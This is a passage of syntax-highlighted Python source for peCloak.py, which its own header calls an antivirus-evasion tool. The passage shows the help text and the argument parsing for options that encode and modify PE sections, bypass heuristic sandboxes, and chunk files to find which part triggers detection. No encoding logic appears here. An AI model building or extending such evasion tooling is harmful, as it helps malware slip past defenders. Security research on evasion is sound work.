style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use&nbsp;a&nbsp;?&nbsp;as&nbsp;the&nbsp;option&nbsp;value&nbsp;to&nbsp;see&nbsp;a&nbsp;list&nbsp;of&nbsp;currently&nbsp;configured&nbsp;presets"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n=========&nbsp;ADDITIONAL&nbsp;MODIFICATION&nbsp;OPTIONS&nbsp;=========\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-s,&nbsp;--section=&nbsp;[section&nbsp;name]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;the&nbsp;pe&nbsp;section&nbsp;to&nbsp;modify"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;that&nbsp;will&nbsp;be&nbsp;modified&nbsp;(default&nbsp;is&nbsp;none)\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Possible&nbsp;options&nbsp;include&nbsp;any&nbsp;valid&nbsp;sections&nbsp;other&nbsp;than&nbsp;.text:"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.rsrc,&nbsp;.rdata,&nbsp;.data,&nbsp;etc.\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Important:&nbsp;If&nbsp;you&nbsp;choose&nbsp;a&nbsp;section&nbsp;to&nbsp;modify&nbsp;that&nbsp;is&nbsp;also&nbsp;being&nbsp;encoded"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;modification&nbsp;happens&nbsp;first!\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;modification&nbsp;happens&nbsp;first!\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-m,&nbsp;--modification=&nbsp;[x]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;the&nbsp;modification&nbsp;type&nbsp;to&nbsp;make&nbsp;for&nbsp;the&nbsp;target&nbsp;"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;section&nbsp;(other&nbsp;than&nbsp;.text)"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Possible&nbsp;options:"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;=&nbsp;swap&nbsp;case&nbsp;of&nbsp;letters&nbsp;(hex&nbsp;values&nbsp;x41-x59&nbsp;and&nbsp;x61-x7a)"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;=&nbsp;replace&nbsp;letters&nbsp;with&nbsp;zeros&nbsp;(x00)"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;=&nbsp;replace&nbsp;non-letters&nbsp;with&nbsp;zeros&nbsp;(x00)\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-r,&nbsp;--range=&nbsp;[x:y]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Specify&nbsp;the&nbsp;range&nbsp;(in&nbsp;bytes)&nbsp;for&nbsp;modification&nbsp;within&nbsp;the"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;pe&nbsp;section&nbsp;(other&nbsp;than&nbsp;.text)\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Format&nbsp;=&nbsp;start:end&nbsp;Example:&nbsp;--range=0:2000"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;The&nbsp;default&nbsp;is&nbsp;to&nbsp;start&nbsp;at&nbsp;the&nbsp;beginning&nbsp;and"</span>&nbsp;<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modify&nbsp;the&nbsp;entire&nbsp;section"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Specifying&nbsp;0&nbsp;for&nbsp;the&nbsp;start&nbsp;value&nbsp;will&nbsp;also&nbsp;"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;at&nbsp;the&nbsp;beginning"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Specifying&nbsp;a&nbsp;number&nbsp;larger&nbsp;than&nbsp;the&nbsp;size&nbsp;of&nbsp;"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;section&nbsp;will&nbsp;default&nbsp;to&nbsp;the&nbsp;end&nbsp;of&nbsp;the&nbsp;section\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n=========&nbsp;OTHER&nbsp;OPTIONS&nbsp;=========\n"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"-c,&nbsp;--chunk=&nbsp;[chunk_size]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Split&nbsp;the&nbsp;file&nbsp;into&nbsp;chunks&nbsp;of&nbsp;designated&nbsp;size&nbsp;for&nbsp;AV&nbsp;scanning"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;May&nbsp;be&nbsp;useful&nbsp;if&nbsp;you&nbsp;need&nbsp;to&nbsp;determine&nbsp;which&nbsp;portion&nbsp;of&nbsp;a&nbsp;file"</span><br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;is&nbsp;triggering&nbsp;detection"</span><br />	sys.exit()<br /><br /><span style="color:#3ad900;font-weight:400">'''<br />	main<br />'''</span>	<br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;main(argv):<br /><br />	header&nbsp;=	<span style="color:#3ad900;font-weight:400">'\n=========================================================================\n'</span><br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;peCloak.py&nbsp;(beta)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\n'</span>&nbsp;&nbsp;<br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'|&nbsp;&nbsp;A&nbsp;Multi-Pass&nbsp;Encoder&nbsp;&amp;&nbsp;Heuristic&nbsp;Sandbox&nbsp;Bypass&nbsp;AV&nbsp;Evasion&nbsp;Tool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\n'</span><br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\n'</span>&nbsp;&nbsp;<br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Author:&nbsp;Mike&nbsp;Czumak&nbsp;|&nbsp;T_V3rn1x&nbsp;|&nbsp;@SecuritySift&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\n'</span><br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'|&nbsp;&nbsp;&nbsp;&nbsp;Usage:&nbsp;peCloak.py&nbsp;[options]&nbsp;[path_to_pe_file]&nbsp;(-h&nbsp;or&nbsp;--help)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\n'</span><br />	header&nbsp;+=	<span style="color:#3ad900;font-weight:400">'=========================================================================\n\n'</span><br /><br />	heuristic_iterations&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">3</span><br />	section_to_encode&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"default"</span><br />	section_to_mod&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	mod_range&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	mod_type&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	section_info&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	section_range&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	chunk_size&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	preset&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />	info&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />	print_section&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />	skip_cave_search&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />	<br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		opts,&nbsp;args&nbsp;=&nbsp;getopt.getopt(argv,&nbsp;<span style="color:#3ad900;font-weight:400">"hai:d:p:e:H:s:r:m:c:"</span>,&nbsp;[<span style="color:#3ad900;font-weight:400">"help"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"add"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"info="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"dump="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"preset="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"encode="</span>,&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"heuristic="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"section="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"range="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"modification="</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"chunk="</span>])<br />	<span style="color:#ff9d00;font-weight:700">except</span>&nbsp;getopt.GetoptError:<br />		print_usage()<br />		sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />		<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;opt,&nbsp;arg&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;opts:<br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-h"</span>):<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;header<br />			print_usage()<br />			sys.exit()&nbsp;&nbsp;&nbsp;&nbsp;<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"--help"</span>):<br />			<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;header<br />			print_help()<br />			sys.exit()<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-i"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--info"</span>):<br />			section_info&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-d"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--dump"</span>):<br />			print_section&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />			section_range&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-e"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--encode"</span>):<br />			section_to_encode&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-H"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--heuristic"</span>):<br />			heuristic_iterations&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(arg)<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-s"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--section"</span>):<br />			section_to_mod&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-r"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--range"</span>):<br />			mod_range&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-m"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--modification"</span>):<br />			mod_type&nbsp;=&nbsp;arg	<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-c"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--chunk"</span>):<br />			chunk_size&nbsp;=&nbsp;arg<br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-a"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--add"</span>):<br />			skip_cave_search&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />		<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;opt&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;(<span style="color:#3ad900;font-weight:400">"-p"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--preset"</span>):<br />			preset&nbsp;=&nbsp;arg<br /><br />	<span style="color:#ff9d00;font-weight:700">try</span>:<br />		<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;=&nbsp;args[<span style="color:#ff0044;font-weight:400">0</span>]<br />	<span style="color:#ff9d00;font-weight:700">except</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[!]&nbsp;ERROR:&nbsp;No&nbsp;pe&nbsp;file&nbsp;provided\n"</span><br />		print_usage()<br />		sys.exit(<span style="color:#ff0044;font-weight:400">2</span>)<br />		<br />	<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;the&nbsp;program&nbsp;with&nbsp;the&nbsp;designated&nbsp;preset&nbsp;and&nbsp;provided&nbsp;exe&nbsp;name</span><br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;preset:<br />		execute_preset(sys.argv[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;preset,&nbsp;sys.argv[<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)-<span style="color:#ff0044;font-weight:400">1</span>])<br />		sys.exit()<br />		<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;header&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;print&nbsp;display&nbsp;header</span><br />	<br />	<span 